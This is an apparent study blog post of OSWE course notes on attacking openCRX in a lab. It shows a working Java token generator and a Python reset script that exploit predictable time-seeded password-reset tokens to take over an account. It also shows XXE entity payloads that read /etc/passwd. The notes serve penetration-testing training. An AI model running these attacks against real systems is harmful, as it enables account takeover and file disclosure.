---
title: "[OSWE, WEB-300] Instructional notes - Part 3"
date: 2026-05-03
author: "CHW"
tags:
  - offsec
description: "OSWE WEB-300 筆記 Part 3，涵蓋 Password Reset Vulnerability、XML Parsing、XXE Exploit、Web Shells、openCRX 身份繞過與 RCE、openITCOCKPIT XSS、DOM-based XSS 等等。"
---

[OSWE, WEB-300] Instructional notes - Part 3
===


# Table of Contents
[TOC]

# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 1"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-1/)
# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 2"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-2/)
>[!Caution]
> 接續 [[OSWE, WEB-300] Instructional notes - Part 2](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-2/) 內容

# openCRX Authentication Bypass and Remote Code Execution
介紹 openCRX 中的幾個漏洞的分析和利用，openCRX 是一個用 Java 編寫的customer relationship management (CRM) Web 應用程式。

[環境範例]\
SSH 連接到伺服器，在 `~/crx/apache-tomee-plus-7.0.5/bin/`目錄執行 opencrx.sh 加上 run 參數啟動 opencrx 
```
┌──(chw💲CHW)-[~/Offsec/OSWE]
└─$ ssh student@opencrx
[2026-04-11 15:33:38] ssh student@opencrx
The authenticity of host 'opencrx (192.168.161.126)' can't be established.
ED25519 key fingerprint is: ...

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
student@lab-awae-126-ubuntu1604-opencrx-243-111:~$ cd crx/apache-tomee-plus-7.0.5/bin
student@lab-awae-126-ubuntu1604-opencrx-243-111:~/crx/apache-tomee-plus-7.0.5/bin$ ./opencrx.sh run
[Server@5caf905d]: Startup sequence initiated from main() method
[Server@5caf905d]: Could not load properties from file
[Server@5caf905d]: Using cli/default properties only
[Server@5caf905d]: Initiating startup sequence...
[Server@5caf905d]: Server socket opened successfully in 18 ms.
[Server@5caf905d]: Database [index=0, id=0, db=file:crx, alias=crx] opened successfully in 1537 ms.
[Server@5caf905d]: Startup sequence completed in 1560 ms.
[Server@5caf905d]: 2026-04-11 00:35:40.104 HSQLDB server 2.4.0 is online on port 9001
...
```
http://opencrx:8080/opencrx-core-CRX \
![image](https://hackmd.io/_uploads/BJ1N5_whbl.png)

## Password Reset Vulnerability Discovery
openCRX 運行在 Apache TomEE 上

Java web applications 可以打包成 JAR、WAR 和 EAR 多種不同的檔案格式，本質上都是 ZIP 文件，但副檔名不同。

- Java Archive (JAR) 通常用於獨立應用程式或 libraries
- Web Application Archive (WAR) 用於將多個 JAR 和靜態內容收集到一個歸檔中
- Enterprise Application Archive (EAR) 可以包含多個 JAR 和 WAR，以將多個 Web 應用程式合併到一個檔案

![image](https://hackmd.io/_uploads/ByZcgFP2Wl.png)
> openCRX 被打包成一個 EAR 文件，在 `/home/student/crx/apache-tomee-plus-7.0.5/apps`

在 `/home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX` 目錄下還有幾個 WAR 檔，但這些文件也應該包含在 EAR 中，無需逐一複製分析
```console
┌──(chw💲CHW)-[~/Offsec/OSWE]
└─$ scp student@opencrx:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
[2026-04-11 17:24:34] scp student@opencrx:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
student@opencrx's password: 
opencrx-core-CRX.ear                                                                                                                                       100%   85MB 305.6KB/s   04:44    

┌──(chw💲CHW)-[~/Offsec/OSWE]
└─$ unzip -q opencrx-core-CRX.ear -d opencrx
[2026-04-11 17:32:02] unzip -q opencrx-core-CRX.ear -d opencrx
```
EAR 確實包含了 WAR ，且每個 WAR 本質上都是一個獨立的 Web appication，擁有自己的靜態內容
```
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ ls -al      
[2026-04-11 17:34:28] ls -al
total 29184
drwxrwxr-x 4 chw chw     4096 Apr 11 17:32 .
drwxrwxr-x 5 chw chw     4096 Apr 11 17:32 ..
drwxr-xr-x 3 chw chw     4096 Jan  2  2019 APP-INF
drwxr-xr-x 2 chw chw     4096 Jan  2  2019 META-INF
-rw-r--r-- 1 chw chw     2028 Jan  2  2019 opencrx-bpi-CRX.war
-rw-r--r-- 1 chw chw     2027 Jan  2  2019 opencrx-caldav-CRX.war
-rw-r--r-- 1 chw chw  3908343 Jan  2  2019 opencrx-calendar-CRX.war
-rw-r--r-- 1 chw chw     2030 Jan  2  2019 opencrx-carddav-CRX.war
-rw-r--r-- 1 chw chw  3675357 Jan  2  2019 opencrx-contacts-CRX.war
-rw-r--r-- 1 chw chw 18285302 Jan  2  2019 opencrx-core-CRX.war
-rw-r--r-- 1 chw chw  1099839 Jan  2  2019 opencrx-documents-CRX.war
-rw-r--r-- 1 chw chw     2750 Jan  2  2019 opencrx-ical-CRX.war
-rw-r--r-- 1 chw chw     1785 Jan  2  2019 opencrx-imap-CRX.war
-rw-r--r-- 1 chw chw     1788 Jan  2  2019 opencrx-ldap-CRX.war
-rw-r--r-- 1 chw chw  2778171 Jan  2  2019 opencrx-rest-CRX.war
-rw-r--r-- 1 chw chw    70520 Jan  2  2019 opencrx-spaces-CRX.war
-rw-r--r-- 1 chw chw     2036 Jan  2  2019 opencrx-vcard-CRX.war
-rw-r--r-- 1 chw chw     2029 Jan  2  2019 opencrx-webdav-CRX.war
```

在 kali 使用 JD-GUI 開啟 opencrx-core-CRX.war\
![image](https://hackmd.io/_uploads/rkyuv9v3Zg.png)

🧠：從 deployment descriptor 下手，如 web.xml

>[!Tip]
> 在 Java Web application 中，`servlet`是處理 request 類別的簡稱。每個框架都有自己的 servlet 版本\
> Java Server Pages (JSP)  是一種用於動態頁面的 servlet。 JSP 可以將 Java 程式碼與傳統的 HTML 程式碼混合使用。

在 JD-GUI 中查看 WAR 文件的內容，可以發現了幾個 JSP 文件提到身份驗證和密碼重設\
![image](https://hackmd.io/_uploads/HJhxf0w2We.png)

在 RequestPasswordReset.jsp 了解該應用程式是如何處理密碼重設
```jsp=56
%><%@ page session="true" import="
java.util.*,
java.net.*,
java.util.Enumeration,
java.io.PrintWriter,
org.w3c.spi2.*,
org.openmdx.portal.servlet.*,
org.openmdx.base.naming.*,
org.opencrx.kernel.generic.*
```
L56 行開始匯入了幾個 custom libraries\
L64 行的 `org.opencrx.kernel.generic.*` 其命名模式與我們正在分析的應用程式一樣

在 L153 處理密碼重設：
```jsp=153
		if(principalName != null && providerName != null && segmentName != null) {
			javax.jdo.PersistenceManagerFactory pmf = org.opencrx.kernel.utils.Utils.getPersistenceManagerFactory();
			javax.jdo.PersistenceManager pm = pmf.getPersistenceManager(
				SecurityKeys.ADMIN_PRINCIPAL + SecurityKeys.ID_SEPARATOR + segmentName, 
				null
			);
			try {
				org.opencrx.kernel.home1.jmi1.UserHome userHome = (org.opencrx.kernel.home1.jmi1.UserHome)pm.getObjectById(
					new Path("xri://@openmdx*org.opencrx.kernel.home1").getDescendant("provider", providerName, "segment", segmentName, "userHome", principalName)
				);
				pm.currentTransaction().begin();
				userHome.requestPasswordReset();
				pm.currentTransaction().commit();
				success = true;
			} catch(Exception e) {
				try {
					pm.currentTransaction().rollback();
				} catch(Exception ignore) {}
				success = false;
			}
		} else {
			success = false;
		}
```
>L153 if 必須為 true，表示 principalName、providerName 和segmentName 不能為空\
>L160 和 161 行 `pm.getObjectById` 方法呼叫使用這些值來取得`org.opencrx.kernel.home1.jmi1.UserHome` 物件\
>L164 呼叫了該物件的 requestPasswordReset method 類別，繼續追蹤密碼重設邏輯
>若 UserHome 類別的定義位於 WAR 檔案中就可以在 JD-GUI 中點選連結的方法名稱

EAR 文件包含一個 application.xml 位於 META-INF 目錄中:
```
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ cat META-INF/application.xml
[2026-04-11 22:30:31] cat META-INF/application.xml
<?xml version="1.0" encoding="UTF-8"?>
<application id="opencrx-core-CRX-App" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="5" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/application_5.xsd">
        <display-name>openCRX EAR</display-name>
        <module id="opencrx-core-CRX">
                <web>
                        <web-uri>opencrx-core-CRX.war</web-uri>
                        <context-root>opencrx-core-CRX</context-root>
                </web>
...
</security-role>
        <library-directory>APP-INF/lib</library-directory>
</application>
```
library-directory element 指定了 external libraries 在 EAR 檔案中的位置。 opencrx -kernel.jar 檔案位於解壓縮後的 /APP-INF/lib目錄中
![image](https://hackmd.io/_uploads/HkKCiAwhbe.png)
> interface 中只顯示 methods 沒有實際運作的 code

透過搜尋 opencrx-kernel.jar 找到五個與 requestPasswordReset 相關的結果\
檢查 org.opencrx.kernel.home1.aop2.UserHomeImpl.class，會發現一個呼叫 org.opencrx.kernel.backend.UserHomes.class 中 requestPasswordReset 方法的簡短 method
![image](https://hackmd.io/_uploads/HkPOUid3Ze.png)

```jsp=111
public Void requestPasswordReset() {
   try {
     UserHomes.getInstance().requestPasswordReset((UserHome)
        sameObject());
      
     return newVoid();
   } catch (ServiceException e) {
     throw new JmiServiceException(e);
   } 
 }
```

點擊 try/catch 區塊中的 requestPasswordReset 檢查 UserHomes類別中的 requestPasswordReset function
```jsp=324
public void requestPasswordReset(UserHome userHome) throws ServiceException {
...   
     String webAccessUrl = userHome.getWebAccessUrl();
     if (webAccessUrl != null) {
       String resetToken = Utils.getRandomBase62(40);
...       
       String name = providerName + "/" + segmentName + " Password Reset";
       String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
       String resetCancelUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetCancel.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
...     
       changePassword((Password)loginPrincipal
           .getCredential(), null, "{RESET}" + resetToken);
     } 
   }
```
> L338 呼叫一個 method 產生一個 token\
> 例如 `resetConfirmUrl` 最終傳給 L364 changePassword method\
> 點擊 getRandomBase62 開啟原始碼，了解 Utils 中是如何產生token

```jsp=1038
public static String getRandomBase62(int length) {
      String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
     Random random = new Random(System.currentTimeMillis());
     String s = "";
     for (int i = 0; i < length; i++) {
       s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62));
     }
     return s;
   }
```
`getRandomBase62`method 接受一個 integer，並回傳一個長度為該整數的隨機字串

### When Random Isn't
 使用 [javac](https://docs.oracle.com/javase/7/docs/technotes/tools/windows/javac.html) 和 [jshell](https://docs.oracle.com/javase/9/jshell/introduction-jshell.htm#JSHEL-GUID-630F27C8-1195-4989-9F6B-2C51D46F52C8) 實作。 JDK 版本與 JRE 版本需要一樣，可以透過`java -version` 指令進行確認\
標準 Java libraries 有兩個主要的隨機數產生器：[java.util.Random](https://docs.oracle.com/javase/8/docs/api/java/util/Random.html) 和 [java.security.SecureRandom](https://docs.oracle.com/javase/8/docs/api/java/security/SecureRandom.html) 

使用 jshell 以互動方式運行 Java code，並觀察這種行為:
1. 導入 Random class，然後聲明兩個具有相同 seed value 的 Random objects
2. 在一個 for 迴圈中，分別對每個 Random 物件呼叫 nextInt method，並比較輸出結果 
```
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ jshell
[2026-04-12 17:39:26] jshell
|  Welcome to JShell -- Version 21.0.10
|  For an introduction type: /help intro

jshell> import java.util.Random;

jshell> Random r1 = new Random(42);
r1 ==> java.util.Random@337d0578

jshell> Random r2 = new Random(42);
r2 ==> java.util.Random@39fb3ab6

jshell> int x, y;
x ==> 0
y ==> 0

jshell> for(int i=0; i<10; i++) { x = r1.nextInt(); y = r2.nextInt(); if(x == y){ System.out.println("They match! " + x);}}
They match! -1170105035
They match! 234785527
They match! -1360544799
They match! 205897768
They match! 1325939940
They match! -248792245
They match! 1190043011
They match! -1255373459
They match! -1436456258
They match! 392236186
```
> 可見使用相同的 seed value 從兩個不同的 Random object 產生了相同的序列

再次使用 jshell 來觀察實際運作。 SecureRandom 物件 使用 byte array 作為 seed，因此需要在 instantiate objects 之前聲明一個 byte array
```
jshell> import java.security.SecureRandom;

jshell> byte[] s = new byte[] { (byte) 0x2a }
s ==> byte[1] { 42 }

jshell> SecureRandom r1 = new SecureRandom(s);
r1 ==> NativePRNG

jshell> SecureRandom r2 = new SecureRandom(s);
r2 ==> NativePRNG

jshell> if(r1.nextInt() == r2.nextInt()) { System.out.println("They match!"); } else { System.out.println("No match."); }
No match.
```
即使使用相同的 seed 實例化，但兩個 SecureRandom 物件也透過 nextInt method 傳回了不同的結果\ 
👉🏻 回顧 token 產生程式碼，以便記住我們正在處理的內容
```jsp=1038
   public static String getRandomBase62(int length) {
      String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
     Random random = new Random(System.currentTimeMillis());
     String s = "";
     for (int i = 0; i < length; i++) {
       s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62));
     }
     return s;
   }
```
openCRX 中的程式碼使用常規的 Random class 產生密碼重設 token，以`System.currentTimeMillis()` 的結果作為初始值 。此方法傳回 "the difference, measured in milliseconds, between the current time and midnight, January 1, 1970 UTC"

🧠：若能夠預測何時會請求 token，那在創建自己的 Random class 時，透過修改 seed value，可以產生一個匹配的 token\
目前還需要一個目標帳號

### Account Determination
openCRX 預設帳號：
- guest / guest
- admin-Standard / admin-Standard
- admin-Root / admin-Root

透過 `http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet?loginFailed=false` 輸入錯誤帳密 → 出現 password reset link

若提交的帳戶有效，則會回應密碼重設請求已成功\
![image](https://hackmd.io/_uploads/B1X2yzKnWx.png)

若提交無效的帳戶會收到錯誤訊息\
![image](https://hackmd.io/_uploads/ryAAyzthbl.png)

### Timing the Reset Request
為產生正確的密碼重設 token，需要猜測 seed value (token 產生的精確毫秒)\
`System.currentTimeMillis()` 傳回的值是 UTC 時間

也可以使用 Kali 的 date 指令，並加上 %s 來取得 milliseconds "since the epoch"。也可以使用 %3N 參數來包含三位元 nanoseconds (這種格式與 Java 方法以毫秒為單位的輸出一致)

使用 curl 指令在提交重置請求前後，使用 date 來取得潛在 seed value 的範圍\
Date 回應 Header 來決定伺服器時間

```
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ date +%s%3N && curl -s -i -X 'POST' --data-binary 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && date +%s%3N
[2026-04-12 21:11:18] date +%s%3N && curl -s -i -X 'POST' --data-binary 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && date +%s%3N
1582038122371
HTTP/1.1 200 
Set-Cookie: JSESSIONID=A0D0F4E8B51E6106371701FC593F61AE; Path=/opencrx-core-CRX; HttpOnly
Content-Type: text/html;charset=UTF-8
Content-Length: 2282
Date: Tue, 18 Feb 2020 15:02:02 GMT
Server: Apache TomEE


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
        <title>Request Password Reset</title>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta http-equiv="Expires" content="0">
        <meta name="viewport" content="width=320; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;">
        <meta name="apple-touch-fullscreen" content="YES" />
        ...
</body>
</html>
1582038122769
```
根據輸出結果可以推測重置令牌的 seed value 介於 1582038122371 和 1582038122769 之間。還包含了 398 個可能性，會根據網路延遲和伺服器處理時間而變化\
🥚 seed value 在密碼重設過程的早期階段就已確定，因此可能更接近開始時間

伺服器回應包含一個 Date 標頭，其值為「Tue, 18 Feb 2020 15:02:02 GMT」\
使用 [EpochConverter](https://www.epochconverter.com/) 網站將此值轉換為 Unix 時間戳記\
![image](https://hackmd.io/_uploads/Hy8ghfKhbx.png)

### Generate Token List
現在已經有了可能的隨機 seed value，接下來需要建立 token generator\
建立包含自訂 Java class 的文件預測 random generation\
檔案中的 class name 須與檔案名稱匹配，並且檔案副檔名必須以 java 結尾

```
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ touch OpenCRXToken.java
[2026-04-14 07:24:55] touch OpenCRXToken.java
   
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ vi OpenCRXToken.java 
[2026-04-14 07:25:07] vi OpenCRXToken.java
```
建立 OpenCRXToken.java 建構基本框架，需要一個 class definition、一個 main method（以便後續可以直接從 cmd 運行）以及一個 generates tokens 的 method\
從 `org.opencrx.kernel.utils.Util.java` 複製大部分的 code 進行修改，使其能夠接受 seed value
```java
import java.util.Random;

public class OpenCRXToken {
  
  public static void main(String args[]) { }
  
  public static String getRandomBase62(int length, long seed) { }
}
```
>  import java.util.Random

建構 main method 需要:
- 一個 int variable 變數儲存標記的長度
- 兩個 long variables 變數儲存起始和終止的 seed values
- 一個String variable 變數儲存 oken values 

使用 for 迴圈遍歷起始值和終止值，並在遍歷過程中呼叫 `getRandomBase62` method 傳入 seed values

```java
import java.util.Random;

public class OpenCRXToken {

    public static void main(String[] args) {
        int length = 40;

        // 把這兩個值改成你自己量到的時間範圍
        long start = Long.parseLong("1582038122371");
        long stop  = Long.parseLong("1582038122769");

        for (long seed = start; seed < stop; seed++) {
            String token = getRandomBase62(length, seed);
            System.out.println(token);
        }
    }

    public static String getRandomBase62(int length, long seed) {
        String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        Random random = new Random(seed);
        StringBuilder s = new StringBuilder();

        for (int i = 0; i < length; i++) {
            s.append(alphabet.charAt(random.nextInt(62)));
        }

        return s.toString();
    }
}
```
>透過上述執行 curl 指令的時間戳記設定起始值和停止值 (`1582038122371`, `1582038122769`)\
將複製 `org.opencrx.kernel.utils.Util.java` 中`getRandomBase62` 方法的內容，並對其進行修改，使其使用傳遞給該方法的 seed value

使用 javac compile program 並使用 java 運行，並 redirect 到 txt
![image](https://hackmd.io/_uploads/SyVYYtjhbg.png)
```
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ javac OpenCRXToken.java
[2026-04-14 13:30:13] javac OpenCRXToken.java
                  
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ java OpenCRXToken > tokens.txt
[2026-04-14 13:30:36] java OpenCRXToken > tokens.txt
    
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ tail tokens.txt
[2026-04-14 13:30:41] tail tokens.txt
SCKF9pp15wUrAZj84eC7m3Z1P5PexTb9wUetcF4T
OA1Otn7zkpspZ7pa3kIxSFsKcRdRelTKaQhmPkf3
aAycQmACHCk1cSdI4YKwnf8m464bmo2xjRtWldPY
1C8wnnzbg47SPVBE55G1mMNOi5k8NeK3KSHEhwEz
DA5AKo2oCR1dTp0u3uH07obqAkBIVhugTRTz3ryV
88mJ3mJmtLNZpN5M5zOqmzu9N7P5Axls7NXrqJZ5
K8iXdlOxPjGlvhu45nPp6QAdplpEK2LVEMieCEIb
l8srznDOnZdCgkSy4MLv67PEWlWkvqdbrP7J7X84
x8p5WnGZLwVOm4Hg4BMuRXdgySxv3vCE0OJ4UQqZ
vMSsitoJwnrHnfB00BneUoeGxMxiQPj3UjkCnBNi
```
建立好 token list 後，接著處理 password reset 流程

### Automating Resets
將  token list 逐一送至 PasswordResetConfirm.jsp 直到找到正確 token，完成密碼重設

在 source code `UserHomes.class` 中可以得知：
```java
 String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
```
目前已經有了 token，但還需要提供 `providerName`、`segmentName` 與 `id` 的值。根據密碼重置的 request 中，可以得知 id 的值是使用者名稱。可以從 RequestPasswordReset.jsp 的 source code 中找到 `providerName` 和 `segmentName` 的線索。

RequestPasswordReset.jsp:
```java
<form role="form" class="form-signin" style="max-width:400px;margin:0 auto;" method="POST" action="RequestPasswordReset.jsp" accept-charset="UTF-8">
    <h2 class="form-signin-heading">Please enter your username, e-mail address or ID</h2>					
    <input type="text" name="id" id="id" autofocus="" placeholder="ID (e.g. guest@CRX/Standard)" class="form-control" />
    <br />
    <button type="submit" class="btn btn-lg btn-primary btn-block">OK</button>
    <br />
    <%@ include file="request-password-reset-note.html" %>
</form>
```
L236 定義 id 輸入字段，其中包含 placeholder `guest@CRX/Standard`，但在 Broswer 中會收到不同的 placeholder\
![image](https://hackmd.io/_uploads/BkmNbuEaZl.png)
> - CRX value 替換成 ProviderName
> - Standard 替換成 SegmentName 

透過檢查 JD-GUI 中的 `WizardInvoker.jsp` 檔案找到 pattern
```jsp=65
/**
 *	The WizardInvoker is invoked with the following URL parameters:
 *	- wizard: path of the wizard JSP
 *	- provider: provider name
 *	- segment: segment name
 *	- xri: target object xri
 *	- user: user name
 *	- password: password
 *  - para_0, para_1, ... para_n: additional parameters to be passed to the wizard (optional)
 *	Example:
 *	http://localhost:8080/opencrx-core-CRX/WizardInvoker.jsp?wizard=/wizards/en_US/UploadMedia.jsp&provider=CRX&segment=Standard&xri=xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard&user=wfro&password=.
```
在 L68, 69 找到對 provider 和 segment 的 references、 L75 可以找到一個 example URL 使用 CRX 作為 provider 且 Standard 作為 segment，與我們在 `RequestPasswordReset.jsp` 中發現的模式相同。我們將在攻擊中嘗試使用 providerName CRX 和 segmentName Standard

現在知道所有值是什麼，開始檢查 `PasswordResetConfirm.jsp` 的 source code，以確定需要向伺服器送哪些資料來進行 reset
```
067  String resetToken = request.getParameter("t");
068  String providerName = request.getParameter("p");
069  String segmentName = request.getParameter("s");
070  String id = request.getParameter("id");
071  String password1 = request.getParameter("password1");
072  String password2 = request.getParameter("password2");
...
163  <form role="form" class="form-signin" style="max-width:400px;margin:0 auto;" method="POST" action="PasswordResetConfirm.jsp" accept-charset="UTF-8">
164      <h2 class="form-signin-heading">Reset password for <%= id %>@<%= providerName + "/" + segmentName %></h2>					
165      <input type="hidden" name="t" value="<%= resetToken %>" />
166      <input type="hidden" name="p" value="<%= providerName %>" />
167      <input type="hidden" name="s" value="<%= segmentName %>" />
168      <input type="hidden" name="id" value="<%= id %>" />
169      <input type="password" name="password1" autofocus="" placeholder="Password" class="form-control" />
170      <input type="password" name="password2" placeholder="Password (verify)" class="form-control" />
171      <br />
172      <button type="submit" class="btn btn-lg btn-primary btn-block">OK</button>
173      <br />
174      <%@ include file="password-reset-confirm-note.html" %>					
175  </form>
```
L163-175 是 reset script 中要模仿的 form element。除了 token、providerName、segmentName 和 id 之外，還需要在 password1 和 password 欄位中提供新的密碼值

將遍歷先前使用 OpenCRXToken Java 類別產生的 token list，並將每個 token POST 到伺服器。接下來檢查伺服器回應，看看重置是否成功，重置成功後退出 for 迴圈
```python
#!/usr/bin/python3

import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"

print("Starting token spray. Standby.")
with open("tokens.txt", "r") as f:
    for word in f:
        # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

        r = requests.post(url=target, data=payload)
        res = r.text

        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            break
```
執行腳本
```
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ ./OpenCRXReset.py -u guest -p password
Starting token spray. Standby.
Successful reset with token: yzs4pCxiRTym9Srs6OrzUY0b9HtEnDK8SrPtjBUe
```
> 執行完成

使用 user:`guest` 和 pass:`password` 在瀏覽器中登入:
![image](https://hackmd.io/_uploads/Skqcae8pZl.png)

## XML External Entity Vulnerability Discovery
利用已登入的權限，從 API 找到 XXE 漏洞

登入後在 Wizards > Explore API 可以找到 REST APIs\
![image](https://hackmd.io/_uploads/By0OkZITWg.png)

API Explorer 使用 [Swagger](https://swagger.io/) 記錄和使用 REST API 

>[!Note]
>  Swagger UI:
>  ✔ API discovery 工具
>    - 列出所有 endpoint
>    - 顯示參數
>    - 顯示 request format
>
>✔ 可直接送 request
>    - 不用自己猜 API
>    - 不用先 reverse JS
>    - 可直接測試 payload

### Introduction to XML
[Extensible Markup Language (XML)](https://zh.wikipedia.org/zh-tw/XML):\
便於人類和機器讀取的方式對資料進行編碼，使用 XML 的應用程式通常會用 parser 來驗證資料並將其轉換為 internal object\
⚠️ XML 詳細資訊可參考: "[ [OSWA, WEB-200] Instructional notes - Part 1 ](https://chw41.github.io/b1og/oswa-web-200-instructional-notes---part-1/#xml-external-entities)"

### XML Parsing
任何依賴 XML 儲存資料的 applicaiton 都會使用到 XML parser 或 processor
1. 當需要處理 XML 資料時，應用程式會呼叫此 component
2. 解析器負責分析標記程式碼
3. Parser 完成 XML 資料處理後，會將處理結果傳回給 applicaiton


XML parsing vulnerabilities 有時會提供強大的攻擊手段:
- Information Disclosure
- Server-Side Request Forgery
- Denial of Service
- Remote Command Injection
- Remote Code Execution

### XML Entities
Document Type Definitions (DTDs) 可用於在 XML document 中宣告 XML Entitie。簡單來說，XML Entitie 是一種包含有效 XML code 的資料結構，該 code 會在文件中被多次引用，也可以被視為內容的 placeholder。

XML entities 有三種類型：internal, external 和 parameter
>[!Tip]
>詳細說明可參考：[[OSWA, WEB-200] notes - Part 1 #xml-entitie](https://chw41.github.io/b1og/oswa-web-200-instructional-notes---part-1/#xml-entitie)

#### 1. Internal Entity
Internal entities 在 DTD 內部進行本地定義
```xml
<!ENTITY name "entity_value">
```
實際範例：
```xml
<!ENTITY test "<entity-value>test value</entity-value>">
```
使用 `<data>&test;</data>`，Parser 後: `<data><entity-value>test value</entity-value></data>`

>[!Important] Offensive site:
>❌ 不能讀檔
>❌ 不能 SSRF
>用來測試 Entity 有沒有開
>Blind XXE 或建構 payload 用

#### 2. External Entity
用於檢索外部資料的 URI ，External Entity 可以分為兩類：private external entity 和 public external entity

- private external entity: `SYSTEM`
```xml
<!ENTITY name SYSTEM "URI">
```
實際範例： (使用外部端點)
```xml
<!ENTITY offsecinfo SYSTEM "http://www.offsec.com/company.xml">
```
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

`SYSTEM` keyword 表示是 private external entity，設計用於公司內部的開發人員或團隊使用，不適用於公共用途。

- public external entity: `PUBLIC`
    
public external entity 的面向更廣泛。例如，在設計使用 XML 的標準（如 HTML 或 SVG）時，可能會使用到公共外部實體
```xml
<!ENTITY % name SYSTEM "URI">
```
實際範例： (使用外部端點)
```xml
<!ENTITY offsecinfo PUBLIC "-//W3C//TEXT companyinfo//EN" "http://www.offsec.com/companyinfo.xml">
```
public external entity 可以指定 public_id，XML pre-processors 會使用 public_id 作為外部解析備用 URI。雖然開發人員使用正確的聲明很重要，但就 Offensive 的目的而言視為同義詞
    
#### 3. Parameter Entity
Parameter Entity 只存在 DTD 中，與其他 entity 非常相似\
定義語法只在於是否包含 `%` prefix 有所不同
```xml
<!ENTITY % name SYSTEM "URI">
```
實際範例： 
```xml
<!ENTITY % course 'WEB 200'>
<!ENTITY Title 'Offensive Security presents %course;'>
```
> Parser 過後顯示: `Offensive Security presents WEB 200`

#### 4. Unparsed External Entities
讓 XML parser 不要解析內容，而是把外部資源當原始資料使用\
使用 `NDATA` declaration 來阻止 XML parser 處理引用的資料
- NDATA = Not Parsed Data: 定義這個 entity 指向的資料不是 XML，不要解析
```xml
<!ENTITY name SYSTEM "URI" NDATA TYPE>
<!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>
```

>[!Tip]
>差異性：
>- 一般 XXE（parsed entity）:
>```xml
><!ENTITY xxe SYSTEM "file:///etc/passwd">
>```
>使用 `<data>&xxe;</data>`\
> 👉🏻 parser 會 `讀檔 → 插入 XML → 當作字串解析`\
> - Unparsed entity:
> ```xml
> <!ENTITY xxe SYSTEM "file:///bin/bash" NDATA binary>
> ```
> 👉🏻 parser 會 `讀檔 → 不解析內容 → 當成 raw data（binary）`

### Understanding XML External Entity Processing Vulnerabilities
external entities 可以透過 declared system identifiers 存取本機或遠端內容\
在 PHP 語言中 XXE 可能導致 RCE，但在 Java 中沒辦法只憑 XXE 達到 RCE

### Finding the Attack Vector
建立一個 simple example
```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>CHW</firstName>
</Contact>
```
解析上述 XML 時，parser 會將 entity reference `&lastname;` 替換為 entity's value `Replaced`\
若 application 解析結果並顯示聯絡人姓名，則會顯示 `CHW Replaced`

修改成以下:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>CHW</firstName>
</org.opencrx.kernel.account1.Contact>
```
